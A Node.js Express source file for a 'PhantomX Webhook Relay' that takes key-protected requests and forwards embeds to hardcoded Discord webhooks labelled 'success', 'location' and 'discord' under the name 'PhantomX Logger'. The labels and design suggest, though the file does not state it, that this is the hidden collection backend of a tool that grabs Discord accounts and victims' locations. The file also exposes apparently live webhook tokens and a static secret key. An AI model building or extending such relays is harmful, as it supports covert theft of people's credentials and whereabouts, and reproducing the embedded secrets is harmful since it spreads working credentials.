const express = require('express');
const app = express();

app.use(express.json());

// الويب هوكات
const webhooks = {
    success: "https://discord.com/api/webhooks/1449849027205005553/PAEzYHXc3N73MSE4amTvjYzQgzeWyTF_G9j2TbszgjuhhbMfraCj71jxXydDrRpbPEWR",
    location: "https://discord.com/api/webhooks/1470005712418771138/r6ejZJ___runqhgu0_IKmepof1DPdL4-d3VI5wJHO32OVEe4AhJLcB2mvJDU1jrn7jls",
    discord: "https://discord.com/api/webhooks/1449124545620611255/OnOeMG0VM3A4XeS3aBDRs5xxETz_rXnc-i2R__zKwyA06VLuNE6nFdJaP38Po1Q80rkB"
};

const SECRET_KEY = "93847165029471658392016485730291";

// صفحة الرئيسية للتأكد
app.get('/', (req, res) => {
    res.send('PhantomX Webhook Relay is running');
});

// روت API
app.post('/log', async (req, res) => {
    try {
        console.log('📨 Received request');
        
        // تحقق من المفتاح
        const key = req.headers['x-key'];
        if (key !== SECRET_KEY) {
            return res.status(401).json({ error: 'Invalid key' });
        }

        const { type, embed } = req.body;
        if (!type || !embed) {
            return res.status(400).json({ error: 'Missing data' });
        }

        // تحديد نوع الويب هوك
        let webhookType = '';
        if (type.toLowerCase().includes('success')) webhookType = 'success';
        else if (type.toLowerCase().includes('location')) webhookType = 'location';
        else if (type.toLowerCase().includes('discord')) webhookType = 'discord';
        else webhookType = type.toLowerCase();

        const webhookUrl = webhooks[webhookType];
        if (!webhookUrl) {
            return res.status(400).json({ error: 'Invalid webhook type' });
        }

        console.log(`📤 Sending to ${webhookType} webhook`);

        // إرسال لـ Discord
        const discordData = {
            embeds: [embed],
            username: "PhantomX Logger",
            avatar_url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png"
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordData)
        });

        console.log(`✅ Discord response: ${response.status}`);
        
        res.json({
            success: true,
            status: response.status,
            type: webhookType
        });

    } catch (error) {
        console.error('🔥 Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
